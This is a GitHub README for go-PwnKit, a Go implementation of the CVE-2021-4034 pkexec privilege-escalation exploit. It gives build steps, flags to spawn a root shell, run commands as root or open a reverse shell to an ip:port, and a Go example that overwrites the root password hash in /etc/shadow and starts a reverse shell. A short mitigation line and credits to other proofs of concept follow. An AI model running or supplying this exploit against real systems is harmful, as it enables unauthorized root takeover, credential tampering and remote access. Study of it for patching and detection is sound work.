# go-PwnKit

A pure-Go implementation of the **CVE-2021-4034 PwnKit** exploit.

The exploit use `syscall.ForkExec` to survive end of main program.



## Installation

```bash
git clone git@github.com:OXDBXKXO/go-PwnKit.git
cd go-PwnKit
make
```



As the exploit relies on a malicious shared library, a **PWN.so** file is generated from ***payload.go*** and embed in the resulting `exploit` executable.

The ***Makefile*** uses `sed` to temporarily change the package name of the ***payload.go*** file to `main`, hence making this ***Makefile*** Linux-only.

As the Go payload is not as reliable as the C one, the ***Makefile*** will compile the exploit with the C payload by default. You can choose to compile with the Go payload using `make build_go`.



## Usage

#### As standalone executable

```
$> ./exploit -h
Usage of ./exploit:
  -c string
        Run command as root in separate process
  -o    Pipe output of forked command to terminal
  -r string
        Open a reverse-shell in separate process. Format: ip:port
  -s    Spawn a root shell
```

The exploit can either be used with a command (`-c`), as a reverse-shell (`-r`) or spawn a root shell (`-s`).



```bash
$> ./exploit -s
sh-5.1#
```

```bash
$> ./exploit -c "cat /etc/passwd"
```

```bash
$> ./exploit -o -c "cat /etc/passwd"
[/etc/passwd content]
```



#### As package

```go
package main

import (
    "github.com/OXDBXKXO/go-PwnKit"
)

func main() {
    // Change root password to 'password'
    gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`, false)

    // Open a reverse-shell
    gopwnkit.RevShell("127.0.0.1:1337")
}

```

Note as `Command` and `RevShell` use `syscall.ForkExec` to run the exploit, resulting processes are separate from the main program and survive its end.

Although **go-PwnKit** can be imported to your project from Github, do not forget that you will execute an untrusted shared library as root. Using a locally compiled `PWN.so` is hence highly recommended. Just sayin' 😚


## Demonstration

```bash
$> ./exploit
sh-5.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-5.1#
```



## Mitigation

Patch `pkexec` if possible, otherwise disable the ***setuid*** bit on the `pkexec` binary.

```bash
chmod 0755 /usr/bin/pkexec
```



## Credits

This project is inspired by several other PoCs of the **PwnKit** exploit.



Thanks to [An00bRektn](https://github.com/An00bRektn/CVE-2021-4034) for the straight-forward exploit setup.

Thanks to [PaterGottesman](https://github.com/PeterGottesman/pwnkit-exploit) and [berdav](https://github.com/berdav/CVE-2021-4034) for the clarity of the exploit explanation.

Thanks to [dzonerzy](https://github.com/dzonerzy/poc-cve-2021-4034) for the *GIO_USE_VFS* trick.
